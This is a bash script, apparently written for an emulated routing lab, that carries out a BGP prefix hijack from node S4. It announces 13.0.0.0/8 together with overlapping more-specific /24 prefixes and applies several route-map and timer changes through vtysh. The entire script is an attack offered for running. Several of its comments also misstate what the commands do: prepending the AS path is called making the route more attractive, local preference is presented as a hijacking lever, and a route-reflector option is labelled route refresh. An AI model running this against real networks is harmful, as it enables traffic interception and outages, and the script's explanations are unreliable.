#!/bin/bash

# Advanced BGP Hijacking Attack Script
# Implements multiple attacking strategies for improved efficiency

node=${1:-S4}
bold=`tput bold`
normal=`tput sgr0`

echo -e "${bold}[*] Starting Advanced BGP Hijacking Attack${normal}"

# Strategy 1: Announce multiple overlapping prefixes (longest prefix match wins)
announce_overlapping_prefixes() {
    echo -e "${bold}[1] Announcing overlapping prefixes for maximum coverage${normal}"
    sudo python3 run.py --node $node --cmd "vtysh -c \"configure terminal\" -c \"router bgp 4\" -c \"network 13.0.0.0/8\" -c \"network 13.0.1.0/24\" -c \"network 13.0.2.0/24\" -c \"network 13.0.3.0/24\""
}

# Strategy 2: Manipulate AS path prepending (make route more attractive)
set_as_path() {
    echo -e "${bold}[2] Setting minimal AS path for attraction${normal}"
    sudo python3 run.py --node $node --cmd "vtysh -c \"configure terminal\" -c \"route-map ATTRACT permit 10\" -c \"set as-path prepend 4\""
}

# Strategy 3: Set high local preference
set_local_preference() {
    echo -e "${bold}[3] Setting high local preference (300) for route preference${normal}"
    sudo python3 run.py --node $node --cmd "vtysh -c \"configure terminal\" -c \"route-map HIJACK permit 10\" -c \"set local-preference 300\""
}

# Strategy 4: Aggressive route advertisement with minimal timers
speed_up_convergence() {
    echo -e "${bold}[4] Reducing BGP timers for faster convergence${normal}"
    sudo python3 run.py --node $node --cmd "vtysh -c \"configure terminal\" -c \"router bgp 4\" -c \"neighbor 9.0.4.1 timers 1 3\""
}

# Strategy 5: Enable aggressive route refresh
enable_route_refresh() {
    echo -e "${bold}[5] Enabling aggressive route refresh${normal}"
    sudo python3 run.py --node $node --cmd "vtysh -c \"configure terminal\" -c \"router bgp 4\" -c \"bgp route-reflector-allow-outbound-policy\""
}

# Execute all strategies
announce_overlapping_prefixes
sleep 2
set_as_path
sleep 2
set_local_preference
sleep 2
speed_up_convergence
sleep 2
enable_route_refresh

echo -e "${bold}[+] Advanced attack initiated!${normal}"
echo -e "${bold}[+] Multiple hijacking strategies active:${normal}"
echo "    - Overlapping prefix announcements"
echo "    - Optimized AS path"
echo "    - High local preference (300)"
echo "    - Minimal BGP timers (1s/3s)"
echo "    - Route refresh enabled"
